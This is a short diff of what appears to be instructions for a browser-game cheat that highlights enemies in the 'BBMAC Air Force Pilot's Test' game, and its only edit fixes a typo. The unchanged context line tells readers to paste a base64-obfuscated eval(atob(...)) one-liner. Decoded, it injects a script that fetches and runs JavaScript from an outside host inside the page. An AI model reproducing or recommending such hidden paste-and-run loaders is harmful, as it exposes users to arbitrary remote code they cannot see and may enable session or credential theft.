@@ -11,4 +11,4 @@ Whilst you're on [BBMAC Air Force Pilot's Test](http://bbmac.net/game/skill_test
 
 `eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3NjcmlwdC5zcmMgPSAiaHR0cHM6Ly9jb3Ntb3Nib3QuZ2EvY2RuL0NvbnRlbnQvaW5qZWN0LmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZChzY3JpcHQpOw=='))`
 
-If it worked, you should see the enemies highlighted with the work 'Enemy'.
+If it worked, you should see the enemies highlighted with the word 'Enemy'.
